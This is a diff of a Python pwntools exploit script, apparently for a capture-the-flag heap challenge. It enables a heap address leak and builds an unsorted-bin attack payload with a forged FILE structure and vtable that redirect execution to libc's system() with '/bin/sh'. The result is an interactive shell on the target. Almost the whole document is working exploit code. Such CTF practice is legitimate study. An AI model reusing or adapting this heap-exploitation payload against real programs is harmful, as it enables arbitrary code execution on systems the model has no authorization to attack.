@@ -49,26 +49,34 @@ malloc_hook = libc + 0x3c4b10
 one_gadget = libc + 0x4525a
 unsorted_bin = libc + 0x3c4b78
 io_file_all = libc + 0x3c5520 #will be refered as pointer to stderr.
+system = libc + 0x45390
 print "libc: " + hex(libc)
 
 #leak heap
-#upgrade(0x10, "a"*16, str(30),5)
-#leak=see()
-#heap = u64(leak.split("a"*16)[1][:6].ljust(8,"\x00")) - 0xd0
-#print hex(heap)
+upgrade(0x10, "a"*16, str(30),5)
+leak=see()
+heap = u64(leak.split("a"*16)[1][:6].ljust(8,"\x00")) - 0xd0
+print hex(heap)
 
 #unsorted bin atk!
+vtable_addr = heap + 0x9c8
+payload = "a"*2000 + p64(0) + p64(0x21) + p64(0) * 2 + "/bin/sh\x00" + p64(0x61)
 
-payload = "a" * 2000 + p64(0) + p64(0x21) + "a"*16 + p64(0)
-payload += p64(0x61) + p64(0xaaa) + p64(io_file_all - 0x10)
+fake_fp = p64(0xddaa) + p64(io_file_all - 0x10)
+fake_fp += p64(0x1)
+fake_fp += p64(0x2)
+fake_fp = fake_fp.ljust(0xa0, "\x00")
+fake_fp += p64(heap + 0x9d8 - 0x108)
+fake_fp = fake_fp.ljust(0xc0, "\x00")
+fake_fp += p64(1)
+
+payload += fake_fp
+payload += p64(vtable_addr)
+payload += p64(1)
+payload += p64(2)
+payload += p64(3)
+payload += p64(0) * 3
+payload += p64(system)
 
 upgrade(len(payload), payload, str(30), 5)
-
-#upgrade(2064 + 8*24 + 160 + 32, "a"*2000+p64(0)+p64(0x21) + "a"*16 + p64(0) + p64(0x61)+p64(unsorted_bin)+p64(io_file_all-0x10) + p64(0)*16 + p64(heap + 0x9b0) + p64(0)*3 + p64(0x10) + p64(0)*2 + p64(heap+0x9b0 + 0xa0) + p64(0)*5 + p64(heap + 0x9b0 + 0x10) + p64(0) * 0xe + p64(0)*3 + p64(one_gadget), str(30), 5)
-raw_input("wow!")
-#trigger write
 p.interactive()
-raw_input("write down.")
-
-
-
